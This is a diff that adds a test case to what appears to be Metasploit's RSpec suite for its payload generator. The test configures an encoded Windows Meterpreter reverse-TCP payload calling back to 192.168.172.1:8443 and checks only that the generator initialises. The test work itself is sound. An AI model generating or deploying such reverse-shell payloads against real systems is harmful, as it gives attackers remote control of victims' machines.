@@ -229,6 +229,31 @@ RSpec.describe Msf::PayloadGenerator do
       it { expect { new_payload_generator }.not_to raise_error }
     end
 
+    context 'when given any valid transform format without a prepended comment' do
+      let(:generator_opts) {
+        {
+            add_code: false,
+            arch: 'x86',
+            badchars: "\x20\x0D\x0A",
+            encoder:  'x86/shikata_ga_nai',
+            datastore: { 'LHOST' => '192.168.172.1', 'LPORT' => '8443' } ,
+            format: 'octal',
+            framework: framework,
+            iterations: 1,
+            keep: false,
+            nops: 0,
+            payload: 'windows/meterpreter/reverse_tcp',
+            platform: 'Windows',
+            space: 1073741824,
+            stdin: nil,
+            nocomment: true,
+            template: File.join(Msf::Config.data_directory, 'templates', 'template_x86_windows.exe')
+        }
+      }
+
+      it { expect { new_payload_generator }.not_to raise_error }
+    end
+
     context 'when given any valid executable format' do
       let(:format) { ::Msf::Util::EXE.to_executable_fmt_formats.sample }
       let(:generator_opts) {
